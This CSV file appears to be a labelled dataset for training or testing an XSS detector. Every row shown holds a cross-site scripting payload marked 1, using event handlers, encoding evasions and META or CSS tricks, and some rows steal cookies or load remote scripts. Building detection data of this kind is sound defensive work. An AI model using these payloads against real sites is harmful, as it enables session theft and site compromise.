payload,label
"<dl onmousemove=""alert(1)"">test</dl>",1
<tr id=x tabindex=1 ondeactivate=alert(1)></tr><input id=y autofocus>,1
<noscript id=x tabindex=1 onbeforeactivate=alert(1)></noscript>,1
"<div id=d><x xmlns=""><iframe onload=javascript:alert(1)""></div> <script>d.innerHTML=d.innerHTML</script>",1
"<style>@keyframes x{}</style><template style=""animation-name:x"" onanimationend=""alert(1)""></template>",1
"<picture onpaste=""alert(1)"" contenteditable>test</picture>",1
"<option draggable=""true"" ondragstart=""alert(1)"">test</option>",1
<big id=x tabindex=1 ondeactivate=alert(1)></big><input id=y autofocus>,1
"<mark onmouseup=""alert(1)"">test</mark>",1
"<img SRC="" &#14; javascript:document.vulnerable=true;"">",1
"<style>@keyframes x{}</style><td style=""animation-name:x"" onanimationend=""alert(1)""></td>",1
"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";",1
"<xmp onmouseleave=""alert(1)"">test</xmp>",1
"<title onkeypress=""alert(1)"" contenteditable>test</title>",1
"<abbr draggable=""true"" ondragstart=""alert(1)"">test</abbr>",1
"<optgroup draggable=""true"" ondrag=""alert(1)"">test</optgroup>",1
"<command oncontextmenu=""alert(1)"">test</command>",1
"<option ondblclick=""alert(1)"">test</option>",1
"<;STYLE>;li {list-style-image: url("";javascript:alert(&#39;XSS&#39;)"";);}<;/STYLE>;<;UL>;<;LI>;XSS",1
"<kbd onkeyup=""alert(1)"" contenteditable>test</kbd>",1
"<style>:target {color: red;}</style><kbd id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></kbd>",1
<svg><sup onload=alert(1)></sup>,1
"<ol oncontextmenu=""alert(1)"">test</ol>",1
<dd id=x tabindex=1 onbeforeactivate=alert(1)></dd>,1
"<details draggable=""true"" ondragenter=""alert(1)"">test</details>",1
<dl onfocusout=alert(1) tabindex=1 id=x></dl><input autofocus>,1
<summary id=x tabindex=1 onbeforeactivate=alert(1)></summary>,1
"<script onkeydown=""alert(1)"" contenteditable>test</script>",1
<svg><col onload=alert(1)></col>,1
"<s draggable=""true"" ondrag=""alert(1)"">test</s>",1
<track id=x tabindex=1 onfocusin=alert(1)></track>,1
"<input onclick=""alert(1)"">test</input>",1
"""><img src=x onerror=javascript:alert((`1`))>",1
"<div draggable=""true"" contenteditable>drag me</div><noframes ondragover=alert(1) contenteditable>drop here</noframes>",1
"<progress onmouseenter=""alert(1)"">test</progress>",1
"<div draggable=""true"" contenteditable>drag me</div><u ondrop=alert(1) contenteditable>drop here</u>",1
"<applet onbeforecopy=""alert(1)"" contenteditable>test</applet>",1
"<style>@keyframes x{}</style><nav style=""animation-name:x"" onanimationstart=""alert(1)""></nav>",1
"<script a="">'>"" SRC=""http://www.securitycompass.com/xss.js""></script>",1
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >,1
"<style>@keyframes slidein {}</style><tt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tt>",1
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;,1
"<thead onbeforecut=""alert(1)"" contenteditable>test</thead>",1
"<frame onmouseover=""alert(1)"">test</frame>",1
<head onfocusout=alert(1) tabindex=1 id=x></head><input autofocus>,1
"<figcaption ondblclick=""alert(1)"">test</figcaption>",1
"<hgroup onmouseout=""alert(1)"">test</hgroup>",1
"<style>@keyframes x{}</style><article style=""animation-name:x"" onanimationend=""alert(1)""></article>",1
<svg><div onload=alert(1)></div>,1
"<aside onmouseover=""alert(1)"">test</aside>",1
<frameset onload=javascript:alert(1)>,1
"<var onmouseover=""prompt(1)"">On Mouse Over</var>?",1
"<div draggable=""true"" contenteditable>drag me</div><param ondrop=alert(1) contenteditable>drop here</param>",1
"<embed onmouseleave=""alert(1)"">test</embed>",1
"<img src=""blah""onmouseover=""document.vulnerable=true;"">",1
"<div draggable=""true"" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable>drop here</bdi>",1
"<u draggable=""true"" ondrag=""alert(1)"">test</u>",1
"<tbody onkeyup=""alert(1)"" contenteditable>test</tbody>",1
"&lt;TABLE&gt;&lt;TD BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",1
<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>,1
"<dir oncut=""alert(1)"" contenteditable>test</dir>",1
"<var onmousedown=""alert(1)"">test</var>",1
"<div draggable=""true"" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>",1
"<style>:target {transform: rotate(180deg);}</style><input id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></input>",1
"<del onmouseover=""alert(1)"">test</del>",1
"<META HTTP-EQUIV=""Link"" Content=""<javascript:alert('XSS')>; REL=stylesheet"">",1
"<style>:target {transform: rotate(180deg);}</style><option id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></option>",1
"<audio autoplay controls onpause=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
<del id=x tabindex=1 ondeactivate=alert(1)></del><input id=y autofocus>,1
"<var draggable=""true"" ondragstart=""alert(1)"">test</var>",1
"<style>:target {transform: rotate(180deg);}</style><rtc id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></rtc>",1
<svg><section onload=alert(1)></section>,1
<script>+-+-1-+-+alert(1)</script>,1
"<title onpaste=""alert(1)"" contenteditable>test</title>",1
"<thead onkeydown=""alert(1)"" contenteditable>test</thead>",1
<noscript id=x tabindex=1 onactivate=alert(1)></noscript>,1
"""`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>",1
"<style>@keyframes x{}</style><optgroup style=""animation-name:x"" onanimationstart=""alert(1)""></optgroup>",1
"<script src=""javascript:alert(1)"">",1
"<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0; URL=http://;URL=javascript:alert('XSS');\"">",1
"<tt onbeforecut=""alert(1)"" contenteditable>test</tt>",1
<svg onfocusout=alert(1) tabindex=1 id=x></svg><input autofocus>,1
"<template onpaste=""alert(1)"" contenteditable>test</template>",1
"<canvas onpaste=""alert(1)"" contenteditable>test</canvas>",1
"<keygen onmouseup=""alert(1)"">test</keygen>",1
"<button onmouseup=""alert(1)"">test</button>",1
"<data onbeforecut=""alert(1)"" contenteditable>test</data>",1
"<samp onkeyup=""alert(1)"" contenteditable>test</samp>",1
"<link draggable=""true"" ondragleave=""alert(1)"">test</link>",1
<x%2Fonxxx=1,1
<rb id=x tabindex=1 onbeforeactivate=alert(1)></rb>,1
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationend=""alert(1)""></aside>",1
"<param oncopy=""alert(1)"" contenteditable>test</param>",1
"<figcaption draggable=""true"" ondrag=""alert(1)"">test</figcaption>",1
"<;/TITLE>;<;SCRIPT>;alert(""XSS"");<;/SCRIPT>;",1
"<style>@keyframes x{}</style><p style=""animation-name:x"" onanimationend=""alert(1)""></p>",1
"<style>:target {transform: rotate(180deg);}</style><bdo id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bdo>",1
<bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>,1
"<ins onkeydown=""alert(1)"" contenteditable>test</ins>",1
<basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>,1
"<style>@keyframes x{}</style><html style=""animation-name:x"" onanimationstart=""alert(1)""></html>",1
"<listing onbeforecopy=""alert(1)"" contenteditable>test</listing>",1
"<strike onbeforecut=""alert(1)"" contenteditable>test</strike>",1
<script onerror=alert(1) src=/></script>,1
<param onblur=alert(1) tabindex=1 id=x></param><input autofocus>,1
‘; alert(document.cookie); var foo=’,1
žscriptualert(EXSSE)ž/scriptu,1
"<style>:target {transform: rotate(180deg);}</style><colgroup id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></colgroup>",1
"<nextid onkeypress=""alert(1)"" contenteditable>test</nextid>",1
"<em onmouseenter=""alert(1)"">test</em>",1
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>",1
<x ondblclick=alert(1)>double click this!,1
"<style><img src=""</style><img src=x onerror=javascript:alert(1)//"">",1
<link id=x tabindex=1 onbeforeactivate=alert(1)></link>,1
"<strong oncopy=""alert(1)"" contenteditable>test</strong>",1
<x %6Fnxxx=1,1
<basefont id=x tabindex=1 onfocus=alert(1)></basefont>,1
"<style>:target {transform: rotate(180deg);}</style><i id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></i>",1
"<footer onmouseleave=""alert(1)"">test</footer>",1
"<multicol onmousedown=""alert(1)"">test</multicol>",1
"<img src\x11=x onerror=""javascript:alert(1)"">",1
"<style>:target {color: red;}</style><address id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></address>",1
"<noembed oncut=""alert(1)"" contenteditable>test</noembed>",1
<rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus>,1
"a="";get"";;&;#10;b="";URL("";"";;&;#10;c="";javascript:"";;&;#10;d="";alert(';XSS';);"";)"";;&#10;eval(a+b+c+d);",1
"""><img src=x onerror=javascript:alert((""1""))>",1
<iframe id=x tabindex=1 onactivate=alert(1)></iframe>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meter id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></meter>",1
"<IMG SRC=x onwheel=""alert(String.fromCharCode(88,83,83))"">",1
"<slot onmouseover=""alert(1)"">test</slot>",1
"<mark draggable=""true"" ondragenter=""alert(1)"">test</mark>",1
<multicol id=x tabindex=1 onfocus=alert(1)></multicol>,1
"<strike onmouseup=""alert(1)"">test</strike>",1
"<section oncontextmenu=""alert(1)"">test</section>",1
"<b oncontextmenu=""alert(1)"">test</b>",1
http://www.<script>alert(1)</script .com,1
"<data onmouseup=""alert(1)"">test</data>",1
"<embed src=""javascript:alert(1)"">",1
"<META HTTP-EQUIV=""Link"" Content=""<%(css)s>; REL=stylesheet"">",1
"<div  style=""position:absolute;top:0;left:0;width:100%;height:100%""  onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>?",1
"""><h1><IFRAME SRC=""javascript:alert('XSS');""></IFRAME>"">123</h1>",1
"<A HREF=""http://1113982867/"">XSS</A>",1
"<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>",1
"<li onbeforecut=""alert(1)"" contenteditable>test</li>",1
"<image onkeyup=""alert(1)"" contenteditable>test</image>",1
""" onfocus=alert(document.domain) ""> <""",1
"<tfoot onkeypress=""alert(1)"" contenteditable>test</tfoot>",1
<svg><nav onload=alert(1)></nav>,1
"<div draggable=""true"" contenteditable>drag me</div><time ondragover=alert(1) contenteditable>drop here</time>",1
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>,1
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>,1
"<var draggable=""true"" ondrag=""alert(1)"">test</var>",1
<tfoot id=x tabindex=1 ondeactivate=alert(1)></tfoot><input id=y autofocus>,1
"<style>@keyframes slidein {}</style><kbd style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></kbd>",1
"<IMG SRC=x onsubmit=""alert(String.fromCharCode(88,83,83))"">",1
"<mark draggable=""true"" ondragleave=""alert(1)"">test</mark>",1
"<ins oncopy=""alert(1)"" contenteditable>test</ins>",1
<script>document.vulnerable=true;</script>,1
"<details onmousemove=""alert(1)"">test</details>",1
"<ol onkeypress=""alert(1)"" contenteditable>test</ol>",1
"&lt;A HREF=\""http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\""&gt;XSS&lt;/A&gt;",1
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<style>:target {color:red;}</style><param id=x style=""transition:color 1s"" ontransitionend=alert(1)></param>",1
"<menu draggable=""true"" ondragleave=""alert(1)"">test</menu>",1
"<style>:target {color: red;}</style><input id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></input>",1
"<data oncontextmenu=""alert(1)"">test</data>",1
<track id=x tabindex=1 onactivate=alert(1)></track>,1
"<col onmouseleave=""alert(1)"">test</col>",1
&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,1
"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?",1
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",1
"<font onclick=""alert(1)"">test</font>",1
"<em onclick=""alert(1)"">test</em>",1
"<kbd draggable=""true"" ondragenter=""alert(1)"">test</kbd>",1
"<style>:target {color:red;}</style><ins id=x style=""transition:color 1s"" ontransitionend=alert(1)></ins>",1
<var id=x tabindex=1 onbeforedeactivate=alert(1)></var><input autofocus>,1
<summary onfocusout=alert(1) tabindex=1 id=x></summary><input autofocus>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><fieldset id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></fieldset>",1
"<embed onkeydown=""alert(1)"" contenteditable>test</embed>",1
<rt id=x tabindex=1 onbeforedeactivate=alert(1)></rt><input autofocus>,1
"<tr onmouseleave=""alert(1)"">test</tr>",1
"<form onkeyup=""alert(1)"" contenteditable>test</form>",1
"<button oncontextmenu=""alert(1)"">test</button>",1
"<td onbeforepaste=""alert(1)"" contenteditable>test</td>",1
<area onblur=alert(1) tabindex=1 id=x></area><input autofocus>,1
"<blockquote draggable=""true"" ondragleave=""alert(1)"">test</blockquote>",1
"<small onkeydown=""alert(1)"" contenteditable>test</small>",1
"<picture ondblclick=""alert(1)"">test</picture>",1
"<style>:target {color: red;}</style><svg id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></svg>",1
"<title oncut=""alert(1)"" contenteditable>test</title>",1
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',1
<x onmouseup=alert(1)>click this!,1
"<var oncopy=""alert(1)"" contenteditable>test</var>",1
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;,1
"<datalist onpaste=""alert(1)"" contenteditable>test</datalist>",1
&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;,1
<section id=x tabindex=1 onfocusin=alert(1)></section>,1
"<dir onmouseenter=""alert(1)"">test</dir>",1
"<IMG SRC=x onmousewheel=""alert(String.fromCharCode(88,83,83))"">",1
"<input onbeforepaste=alert(1) value="""" autofocus>",1
"<svg draggable=""true"" ondrag=""alert(1)"">test</svg>",1
"<style>:target {transform: rotate(180deg);}</style><menuitem id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></menuitem>",1
"<option draggable=""true"" ondragenter=""alert(1)"">test</option>",1
"<sup oncopy=""alert(1)"" contenteditable>test</sup>",1
""";a=prompt,a()//",1
"<menu onmousedown=""alert(1)"">test</menu>",1
&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,1
<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>,1
"<IMG SRC=x oncontextmenu=""alert(String.fromCharCode(88,83,83))"">",1
"&lt;DIV STYLE=\""background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\""&gt;",1
"<div draggable=""true"" contenteditable>drag me</div><ul ondragover=alert(1) contenteditable>drop here</ul>",1
"<element onmousedown=""alert(1)"">test</element>",1
"<dt onpaste=""alert(1)"" contenteditable>test</dt>",1
"<a onmouseenter=""alert(1)"">test</a>",1
<noscript id=x tabindex=1 onfocus=alert(1)></noscript>,1
"<style>:target {color:red;}</style><mark id=x style=""transition:color 1s"" ontransitionend=alert(1)></mark>",1
"<figcaption onmouseout=""alert(1)"">test</figcaption>",1
"<rtc oncopy=""alert(1)"" contenteditable>test</rtc>",1
"<style>BODY{-moz-binding:url(""http://www.securitycompass.com/xssmoz.xml#xss"")}</style>",1
"<header draggable=""true"" ondragenter=""alert(1)"">test</header>",1
"<style>@keyframes x{}</style><sup style=""animation-name:x"" onanimationstart=""alert(1)""></sup>",1
"<div draggable=""true"" contenteditable>drag me</div><xmp ondragover=alert(1) contenteditable>drop here</xmp>",1
"<command ondblclick=""alert(1)"">test</command>",1
"<dl onpaste=""alert(1)"" contenteditable>test</dl>",1
"<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=javascript:alert('XSS');\"">",1
<hr onfocusout=alert(1) tabindex=1 id=x></hr><input autofocus>,1
<ruby id=x tabindex=1 onbeforedeactivate=alert(1)></ruby><input autofocus>,1
"<listing onmouseover=""alert(1)"">test</listing>",1
"<span oncontextmenu=""alert(1)"">test</span>",1
"<acronym onclick=""alert(1)"">test</acronym>",1
<span onblur=alert(1) tabindex=1 id=x></span><input autofocus>,1
"<IFRAME width=""420"" height=""315"" frameborder=""0"" onload=""alert(document.cookie)""></IFRAME>",1
<marquee id=x tabindex=1 onfocusin=alert(1)></marquee>,1
"<div draggable=""true"" contenteditable>drag me</div><input ondrop=alert(1) contenteditable>drop here</input>",1
"<style>@keyframes x{}</style><input style=""animation-name:x"" onanimationend=""alert(1)""></input>",1
<datalist id=x tabindex=1 onfocus=alert(1)></datalist>,1
"<a href=""\x19javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",1
"<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>",1
